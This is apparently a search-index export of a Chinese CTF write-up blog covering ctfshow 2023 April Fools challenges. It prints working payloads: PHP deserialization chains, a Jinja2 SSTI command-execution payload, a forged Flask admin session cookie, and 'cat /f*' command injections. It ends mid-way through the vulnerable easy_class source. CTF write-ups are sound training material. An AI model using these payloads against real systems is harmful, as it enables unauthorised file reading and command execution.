<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023ctfshow愚人杯</title>
    <url>/2023/04/03/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>任意文件下载</p>
<p>直接下载index.php  base64decode后发现flag</p>
<h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><p>做的时候想的是命令执行结果时间相对慢了一些</p>
<p>利用php原生类读取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&quot;php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/04/03/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230403204845277.png" class="" title="image-20230403204845277">



<p>base64 解密</p>
<p><strong>check.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cipher</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> - <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;fe1ka1ele1efp&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">cipher</span>(<span class="variable">$str</span>));</span><br></pre></td></tr></table></figure>

<p>凯撒密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cipher</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &gt; <span class="number">10000</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    charset = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span></span><br><span class="line">    shift = <span class="number">4</span></span><br><span class="line">    shifted = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        pos = charset.find(char)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pos != -<span class="number">1</span>:</span><br><span class="line">            new_pos = (pos + shift) % <span class="built_in">len</span>(charset)</span><br><span class="line">            shifted += charset[new_pos]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shifted += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> shifted</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&quot;p8vfuv8g8v8py&quot;</span></span><br><span class="line"><span class="built_in">print</span>(cipher(cmd))</span><br><span class="line"><span class="comment">#fe1ka1ele1efp</span></span><br></pre></td></tr></table></figure>



<p>命令执行链</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;check.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&quot;php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>; &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa-&gt;coos=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa-&gt;coos-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">EeE</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<img src="/2023/04/03/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230403205452683.png" class="" title="image-20230403205452683">







<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hello/&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cd ..&amp;&amp;cat *&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>jwt伪造</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;S3cr3tK3y&#x27;</span> -t <span class="string">&quot;&#123;&#x27;loggedin&#x27;:True,&#x27;role&#x27;:&#x27;admin&#x27;,&#x27;username&#x27;:&#x27;admin&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure>



<p>发现任意文件下载</p>
<p>下载app.py</p>
<p>发现hello路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure>



<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p><code>ArrayObject</code> 是 PHP 内置的一个类，用于将数组对象化，提供了访问和操作数组的方法和属性。下面是一些 <code>ArrayObject</code> 的特性和使用方法：</p>
<p>这个表示方法是指在 PHP 中使用序列化函数 serialize() 或 unserialize() 进行对象或变量序列化与反序列化时，对不同类型的数据采用的标识符。</p>
<p>具体的表示方法如下：</p>
<ul>
<li>a - 数组型，如 array(1, 2, 3)。</li>
<li>b - 布尔型，如 true 或 false。</li>
<li>d - 浮点型，如 3.14。</li>
<li>i - 整数型，如 123。</li>
<li>o - 共同对象，如 StdClass 对象。</li>
<li>r - 对象引用，如对象的引用 ID。</li>
<li>s - 非转义的二进制字符串，如 “hello”。</li>
<li>S - 转义的二进制字符串，如 “hel\nlo”。</li>
<li>C - 自定义对象，如自定义类对象。</li>
<li>O - 类对象，如类对象。</li>
<li>N - 空，如 null。</li>
<li>R - 指针引用，如引用的指针地址。</li>
<li>U - Unicode 编码的字符串，如 “你好”。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>()));</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>; </span><br><span class="line"><span class="comment">// C:11:&quot;ArrayObject&quot;:71:&#123;x:i:0;a:1:&#123;i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="暗网聊天室"><a href="#暗网聊天室" class="headerlink" title="暗网聊天室"></a>暗网聊天室</h1><p><a href="https://ctf-show.feishu.cn/docx/KTfvd3GCOodJrRxVnk5ck1LunYb">https://ctf-show.feishu.cn/docx/KTfvd3GCOodJrRxVnk5ck1LunYb</a></p>
<h1 id="easy-class"><a href="#easy-class" class="headerlink" title="easy_class"></a>easy_class</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 09:28:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">ctfshow</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_1</span> = <span class="number">0x41</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_2</span> = <span class="number">0x7b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_3</span> = <span class="number">0x5b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_4</span> = <span class="number">0x60</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_5</span> = <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_6</span> = <span class="number">0x5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_SIZE__</span>= <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_VAL_SIZE__</span>= <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cursor</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ref_table</span>=[];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">neaten</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;ctfshow&#x27;</span>)===<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;flag&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">fill</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]+<span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;\x00&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">neaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;_clear_&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="keyword">__NAMESPACE__</span>.<span class="string">&quot;\C::clear&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x36d</span>,<span class="string">&#x27;Q&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x30</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNeaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]+<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>);</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">4</span>));</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">12</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>));</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$size</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkRef</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;v&quot;</span>,<span class="variable">$size</span>));</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="number">0x31</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$size</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$ref</span>,<span class="variable">$this</span>-&gt;ref_table))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref not exists!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seekCursor</span>(<span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cref</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">20</span>);</span><br><span class="line">        <span class="variable">$csize</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;v&quot;</span>, <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">2</span>));</span><br><span class="line">        <span class="variable">$usize</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$csize</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$val</span>,<span class="variable">$fmt</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="variable">$fmt</span>,<span class="variable">$val</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;cursor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">truncation</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$data</span>),function(<span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$var</span>!==<span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seekCursor</span>(<span class="params"><span class="variable">$cursor</span></span>)</span>&#123;</span><br><span class="line">        <span 